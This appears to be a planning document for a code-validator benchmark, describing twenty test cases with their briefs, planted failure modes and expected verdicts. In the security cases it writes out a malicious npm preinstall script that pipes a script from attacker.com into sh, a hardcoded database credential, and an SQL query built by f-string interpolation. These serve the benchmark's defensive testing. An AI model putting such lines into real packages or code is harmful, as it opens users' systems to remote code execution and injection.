# aegis-bench v2 — 16 new cohort cases

This plan grows the bench from 4 cases (v1) to 20 (v2). The four existing
cases sit in Team-AI/aegis-bench/ today and move into this repo at code
extraction (August 2026). The 16 new cases described here are the v2
deliverable: they will be drafted alongside extraction so that on the
day of the public release, the bench demonstrates the full surface of
the validator.

## Status legend

- 🟢 **Drafted** — directory, brief.json, expected.json, README all exist
- 🟡 **Scaffolded** — directory exists, contents not yet drafted
- ⚪ **Planned** — described here only, no files yet

As of this commit, all 16 are ⚪ Planned. The 4 v1 cases (01-04) are
already 🟢 Drafted in the Team-AI repo.

## Categories

| Category | Cases | What they exercise |
|---|---|---|
| A — Palette substitution | 01 | Deterministic override (design fidelity) |
| B — Forbidden-pattern violation | 02 | Deterministic override (philosophy rules) |
| C — Clean pass | 03 | Whole pipeline, no firings |
| D — Runtime correctness | 04 | Deterministic check (import case) |
| **E — Build failures** | **05, 06, 07** | **Build runners (npm / tsc / python)** |
| **F — Test failures** | **08, 09** | **Test runners (pytest / jest)** |
| **G — Semantic & runtime** | **10, 11, 12** | **AST + semantic checks** |
| **H — Security & supply chain** | **13, 14, 15** | **Sandbox + scrub + regex** |
| **I — Design fidelity** | **16, 17** | **LLM judge + override** |
| **J — Feature coverage** | **18, 19** | **Hybrid layer (LLM + deterministic evidence)** |
| **K — Multi-stack clean** | **20** | **Python clean pass (Python stack baseline)** |

## v1 cases (already in Team-AI/aegis-bench/)

01, 02, 03, 04 — see `Team-AI/aegis-bench/cohort/SUMMARY.md` for details.

These will be copied verbatim into this repo at code extraction.

---

## v2 cases — Detailed plan

### Category E — Build failures

#### 05 — npm-install-missing-dep
- **Stack:** Node.js
- **Brief:** "A simple todo list React app."
- **Generated failure mode:** `package.json` references `react@99.0.0`
  (a version that doesn't exist). `npm install` fails with `ENOTFOUND`.
- **Validator layer fired:** Build (`npm install` subprocess)
- **Expected verdict:** `FAIL · build_install · stdout includes "ENOTFOUND"`
- **Baseline comparison:** eslint won't catch (config valid); GPT-4
  critique might flag the unusual version but won't run install.

#### 06 — typescript-compile-error
- **Stack:** Node.js (TypeScript)
- **Brief:** "A React component that displays user profile data."
- **Generated failure mode:** The component imports a type from
  `./types` but the types file declares `interface UserProfile`
  with a property `name: string`, while the component uses
  `user.fullName`. `tsc --noEmit` fails.
- **Validator layer fired:** Build (TypeScript compiler subprocess)
- **Expected verdict:** `FAIL · build_compile · tsc error TS2339`
- **Baseline comparison:** eslint with @typescript-eslint catches some
  but not all; tsc is the ground truth, which Aegis runs.

#### 07 — python-syntax-error
- **Stack:** Python
- **Brief:** "A FastAPI endpoint that returns the current time."
- **Generated failure mode:** Generated code has `async def get_time()`
  using `await asyncio.sleep(1)` but the file is missing `import asyncio`.
- **Validator layer fired:** AST parse (Python `ast` module)
- **Expected verdict:** `FAIL · ast_parse · NameError: asyncio not defined`
- **Baseline comparison:** Pylint catches; ruff catches; raw LLM critique
  might miss because the syntax is valid but the import is missing.

### Category F — Test failures

#### 08 — pytest-assertion-fail
- **Stack:** Python
- **Brief:** "A function that computes weekly compounded interest, with tests."
- **Generated failure mode:** Function uses simple interest formula
  (`P * r * t`) instead of compound (`P * (1+r)^t`). Generated pytest
  asserts the compound result. Test fails.
- **Validator layer fired:** Tests (pytest subprocess)
- **Expected verdict:** `FAIL · test_run · AssertionError, expected 1102.50 got 1100.00`
- **Baseline:** No static tool catches this. Only test execution does.
  This case is the strongest argument for build+test-runners-in-validator.

#### 09 — jest-component-snapshot-mismatch
- **Stack:** Node.js (React + Jest)
- **Brief:** "A pricing table with three tiers."
- **Generated failure mode:** Component renders 3 tiers but with tier
  labels in wrong order ("Pro", "Free", "Enterprise" instead of "Free",
  "Pro", "Enterprise"). The generated test (also AI-written) catches
  this via snapshot.
- **Validator layer fired:** Tests (jest subprocess)
- **Expected verdict:** `FAIL · test_run · snapshot mismatch`
- **Baseline:** Demonstrates the value of generated-tests-validate-generated-code
  loop.

### Category G — Semantic & runtime

#### 10 — missing-event-handler
- **Stack:** Static HTML / vanilla JS
- **Brief:** "A simple calculator with + - × ÷ buttons."
- **Generated failure mode:** HTML has `<button onclick="add()">` but
  the JS file defines `addition()` instead of `add()`. Calculator UI
  renders but clicks do nothing.
- **Validator layer fired:** Semantic check — handler-existence scan
  in JS for every `onclick=` reference in HTML.
- **Expected verdict:** `FAIL · semantic · undefined handler "add"`
- **Baseline:** ESLint with html plugin catches; raw lint without
  cross-file resolution misses.

#### 11 — async-without-await
- **Stack:** Python
- **Brief:** "An async function that fetches data from three APIs in parallel."
- **Generated failure mode:** Function is declared `async def` and uses
  `asyncio.gather(...)` correctly, but **inside the gather it calls
  `requests.get()` (sync)** instead of `httpx` or `aiohttp`. Code runs
  but blocks the event loop — parallel benefit is fake.
- **Validator layer fired:** AST + semantic — detect sync I/O in async
  function bodies.
- **Expected verdict:** `FAIL · semantic_async · sync requests in async context`
- **Baseline:** This is one of the high-value catches. Ruff has a rule
  for it (ASYNC-series) but most teams don't enable it; Aegis enables
  by default.

#### 12 — race-condition-state-update
- **Stack:** Node.js (React)
- **Brief:** "A counter that increments by 1 on click."
- **Generated failure mode:** Uses `setCount(count + 1)` instead of
  `setCount(c => c + 1)`. Single click works; rapid clicks lose updates.
- **Validator layer fired:** Semantic — React state update lint rule
  (functional updater preferred when next depends on previous).
- **Expected verdict:** `FAIL · semantic_react · stale state in setter`
- **Baseline:** eslint-plugin-react-hooks (`react-hooks/exhaustive-deps`)
  doesn't catch this specifically. Most teams ship the bug.

### Category H — Security & supply chain

#### 13 — malicious-preinstall-script
- **Stack:** Node.js
- **Brief:** "A simple Node.js script that prints hello."
- **Generated failure mode:** `package.json` includes a hypothetical
  malicious `preinstall` script: `"preinstall": "curl http://attacker.com/x.sh | sh"`.
  The case verifies that Aegis runs `npm install --ignore-scripts` and
  the preinstall does NOT execute.
- **Validator layer fired:** Build (`npm install --ignore-scripts`) +
  subprocess monitor (verifies no network calls outside npm registry).
- **Expected verdict:** `PASS · install_completed · preinstall_skipped`
  (the preinstall is logged but didn't run)
- **Baseline:** Most validators run plain `npm install` and execute
  the preinstall. This case is direct evidence of the supply-chain
  hardening.

#### 14 — hardcoded-secret-detection
- **Stack:** any
- **Brief:** "A script that reads from a database."
- **Generated failure mode:** Code contains
  `DATABASE_URL = "postgres://admin:hunter2@prod.example.com:5432/db"`
  as a hardcoded string instead of reading from environment.
- **Validator layer fired:** Regex — hardcoded credential patterns
  (URI-with-password, AWS access keys, generic API keys with high entropy).
- **Expected verdict:** `FAIL · regex_security · hardcoded credential at line N`
- **Baseline:** TruffleHog / gitleaks catch this. Aegis runs the same
  patterns inline.

#### 15 — sql-injection-vulnerability
- **Stack:** Python (FastAPI / SQLAlchemy)
- **Brief:** "A search endpoint that returns users by name."
- **Generated failure mode:** Endpoint uses string concatenation:
  `f"SELECT * FROM users WHERE name = '{user_input}'"` instead of
  parameterized query.
- **Validator layer fired:** AST — detect raw SQL with f-string / format
  interpolation of request-derived variables.
- **Expected verdict:** `FAIL · ast_security · sql injection at line N`
- **Baseline:** Bandit catches; Aegis runs equivalent rules.

### Category I — Design fidelity (LLM judge + override)

#### 16 — typography-substitution
- **Stack:** Static HTML / React
- **Brief:** Forest-green editorial palette, **Lora heading + Inter body**
  (same brand as case 01, different failure mode).
- **Generated failure mode:** Code uses correct palette hexes (so case 01's
  override doesn't fire), but typography is `system-ui` everywhere — both
  fonts absent.
- **Validator layer fired:** LLM judge + deterministic override
  (font-name search in CSS/HTML).
- **Expected verdict:** `FAIL · design_fidelity · capped 4/10 · missing fonts: Lora, Inter`
- **Baseline:** Pure LLM judge tends to score this 7/10 ("looks clean,
  consistent typography"). The override demonstrates the moat: LLM
  judgment is allowed only where evidence-finding can override it.

#### 17 — spacing-scale-violation
- **Stack:** React
- **Brief:** `density: "spacious"`, `philosophy: "editorial"`, brief explicitly
  says "generous whitespace, vertical rhythm matters."
- **Generated failure mode:** Code uses Tailwind defaults: `p-4 m-2 gap-2`
  — tight, compact. Reads as a SaaS dashboard, not editorial.
- **Validator layer fired:** LLM judge + override (detect compact
  Tailwind classes in spacious-philosophy contexts).
- **Expected verdict:** `FAIL · design_fidelity · density mismatch · spacious requested, compact delivered`
- **Baseline:** Hard for any rule-based tool. The override here uses
  density-class statistics (how many `p-1 / p-2` vs `p-8 / p-12`).

### Category J — Feature coverage (hybrid layer)

#### 18 — missing-csv-export
- **Stack:** React + Node.js
- **Brief:** "A dashboard with a user list and **a button to export the
  current view to CSV**."
- **Generated failure mode:** Dashboard renders correctly, user list
  works, but **no CSV export button anywhere**. The agent partially
  understood the brief.
- **Validator layer fired:** Feature coverage (hybrid). LLM is asked
  "is there a CSV export?" → says "no". Deterministic override searches
  code for `download`, `csv`, `text/csv`, `Blob` patterns → also "no".
  Both agree → confident FAIL.
- **Expected verdict:** `FAIL · feature_coverage · missing: csv_export · LLM and evidence agree`
- **Baseline:** Pure LLM can be tricked by adjacent words ("export"
  appears in tooltip text). The evidence-search override prevents false
  passes.

#### 19 — missing-dark-mode-toggle
- **Stack:** React
- **Brief:** "A note-taking app with **light/dark mode toggle**."
- **Generated failure mode:** App renders in dark mode by default
  (matching `prefers-color-scheme: dark`) but there is **no toggle**.
  Users can't switch.
- **Validator layer fired:** Feature coverage (hybrid). LLM judge
  notices the dark styling and says "PASS — dark mode supported".
  Deterministic override searches for `theme`, `toggle`, `light/dark`
  interactive elements → finds nothing interactive.
- **Expected verdict:** `FAIL · feature_coverage · LLM said pass, deterministic override fired`
- **Baseline:** This is the case that best demonstrates "LLM-as-judge
  with deterministic override" doctrine. Show this to a senior dev
  considering Aegis.

### Category K — Multi-stack clean pass

#### 20 — python-clean-pass
- **Stack:** Python (FastAPI + pytest)
- **Brief:** "A `/health` endpoint that returns 200 with version info, with tests."
- **Generated failure mode:** None. Code is clean, imports correct,
  tests pass, no security issues, no semantic problems.
- **Validator layer fired:** All Python layers run, none fire.
- **Expected verdict:** `PASS · all_layers_clean`
- **Why this case matters:** Case 03 is the Node.js clean pass. This
  is the Python equivalent — bench coverage for "what does a healthy
  Python run look like."

---

## Cohort properties (v2 totals)

- **Stacks covered:** Node.js (cases 01, 02, 03, 04, 05, 06, 09, 10, 12,
  13, 17, 18, 19), Python (07, 08, 11, 14, 15, 20), Static HTML (10
  overlaps), Multi-stack (16, 17 brand-driven)
- **Layer types exercised:**
  - Deterministic AST: 04, 07, 11, 15
  - Deterministic build: 05, 06, 13
  - Deterministic test: 08, 09
  - Deterministic regex: 14, 15
  - Deterministic semantic: 10, 11, 12
  - LLM-judge + override: 01, 02, 16, 17
  - Hybrid feature coverage: 18, 19
  - Clean pass: 03 (Node), 20 (Python), 13 partial (sandboxing)
- **Failure modes covered:** missing imports, type mismatch, missing
  handlers, race conditions, sync-in-async, hardcoded secrets, SQL
  injection, supply-chain attacks, design substitution, typography
  substitution, density mismatch, feature gaps, dark-mode-only,
  failing tests, snapshot mismatch
- **Verdicts:** 14 expected FAIL · 5 expected PASS · 1 nuanced
  (case 13 passes with logged-but-skipped malicious script)

## Baselines plan (for case directory under `aegis-bench/baselines/`)

For every case where it makes sense, we publish the verdict of three
alternative tools:

1. **Raw LLM critique** (Claude with the same code + same brief, no
   validator pipeline) — establishes the "vibes-based AI judge" baseline
2. **Conventional static tools** — eslint, ruff, mypy, bandit, tsc, jest,
   pytest, gitleaks, trufflehog — establishes the "linter stack" baseline
3. **GPT-4 turbo critique** — same role as Claude baseline, different
   model — establishes "is this a model-specific quirk"

The bench output table shows, per case, what each baseline produced.
Reviewers can verify the claim "Aegis catches things baselines miss"
in 5 minutes of running the bench.

## Drafting workflow (post-extraction, August 2026)

For each case (05–20):

1. Create `cohort/<NN>-<slug>/` directory.
2. Write `brief.json` — the input brief the AI was given.
3. Write the `input/` subdirectory — the AI's "generated code" for this
   brief. (This is hand-crafted to exhibit the specific failure mode,
   not actual LLM output — that would be non-reproducible.)
4. Write `expected.json` — the verdict Aegis should produce.
5. Write `README.md` — what the case demonstrates, what the baselines
   produce, why this matters.
6. Run the case through Aegis locally; if Aegis doesn't produce the
   expected verdict, either (a) fix the case input, or (b) fix Aegis.
   Either is acceptable — bench cases and validator code evolve
   together.
7. Commit: `case(05): npm install missing dep · expected FAIL · build_install`

## Drafting timeline

- **June 2026** — Draft cases 05–10 (build + test + simple semantic)
- **July 2026** — Draft cases 11–15 (semantic + security)
- **August 2026** — Draft cases 16–20 (design + feature + multi-stack)
  alongside code extraction from Team-AI
- **September 2026 launch** — All 20 cases live in this repo, all pass
  against the extracted validator, baselines published.

## Why 20 (not more, not fewer)

20 is enough to exercise every layer category and produce a credible
public benchmark. Fewer than 16 leaves coverage gaps reviewers will
notice; more than 25 dilutes the per-case attention readers can pay.

The roadmap doc commits to **40+ by Q4 2026** — that growth happens
post-launch, driven by community contributions and real-world failure
modes that ship to us via issues.
